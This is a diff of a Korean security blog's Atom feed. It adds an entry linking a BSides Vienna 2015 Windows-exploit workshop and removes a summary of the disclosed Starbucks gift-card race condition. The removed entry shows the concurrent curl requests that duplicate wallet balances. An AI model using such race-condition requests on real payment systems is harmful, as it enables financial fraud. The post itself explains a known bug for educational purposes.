@@ -4,7 +4,7 @@
   <title><![CDATA[KC's blog]]></title>
   <link href="http://zomo.heroku.com/atom.xml" rel="self"/>
   <link href="http://zomo.heroku.com/"/>
-  <updated>2016-01-11T15:31:55+09:00</updated>
+  <updated>2016-01-11T15:40:25+09:00</updated>
   <id>http://zomo.heroku.com/</id>
   <author>
     <name><![CDATA[KC]]></name>
@@ -12,6 +12,15 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[BSides Vienna 2015: Writing Your First Windows Exploit in Less Than One Hour]]></title>
+    <link href="http://zomo.heroku.com/blog/2016/01/11/bsides-vienna-2015-writing-your-first-windows-exploit-in-less-than-one-hour/"/>
+    <updated>2016-01-11T15:39:41+09:00</updated>
+    <id>http://zomo.heroku.com/blog/2016/01/11/bsides-vienna-2015-writing-your-first-windows-exploit-in-less-than-one-hour</id>
+    <content type="html"><![CDATA[<p>BSides Vienna 2015 에 발표된 <a href="https://github.com/maldevel/BSides_Vienna_2015/blob/master/exploit_workshop.pdf">Writing your first windows exploit in less than one hour</a> 를 정리해본다.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Sock_sendpage]]></title>
@@ -3155,39 +3164,6 @@ BoxType 은 4 글자 코드로 구성된다. FourCC 라고 불리는데, <code>c
     <updated>2015-07-17T20:34:21+09:00</updated>
     <id>http://zomo.heroku.com/blog/2015/07/17/all-your-biases-belong-to-us</id>
     <content type="html"><![CDATA[<p><a href="http://www.rc4nomore.com/vanhoef-usenix2015.pdf">All Your Biases Belong To Us</a></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Hacking Starbucks for Unlimited Coffee]]></title>
-    <link href="http://zomo.heroku.com/blog/2015/07/17/hacking-starbucks-for-unlimited-coffee/"/>
-    <updated>2015-07-17T20:15:05+09:00</updated>
-    <id>http://zomo.heroku.com/blog/2015/07/17/hacking-starbucks-for-unlimited-coffee</id>
-    <content type="html"><![CDATA[<p><a href="http://sakurity.com/blog/2015/05/21/starbucks.html">Hacking Starbucks for unlimited coffee</a></p>
-
-<p>Sakurity 의 글 하나를 요약해본다.</p>
-
-<h4>race condition</h4>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>POST /step1?amount=1&from=wallet1&to=wallet2
-</span><span class='line'>POST /step2?confirm</span></code></pre></td></tr></table></div></figure>
-
-
-<p>로 two steps 로 되어있는데,</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>curl starbucks/step1 -H Cookie: session=session1 --data amount=1&from=w1&to=w2
-</span><span class='line'>curl starbucks/step1 -H Cookie: session=session2 --data amount=1&from=w1&to=w2
-</span><span class='line'>
-</span><span class='line'>curl starbucks/step2confirm -H Cookie: session=session1 & curl starbucks/step2?confirm -H Cookie: session=session2</span></code></pre></td></tr></table></div></figure>
-
-
-<p>세션 2 개를 만들어서 대여섯번 시도하니, 돈이 복사가 되었다고 한다. 게임에 많이 나오는 돈복사 버그.</p>
 ]]></content>
   </entry>
   
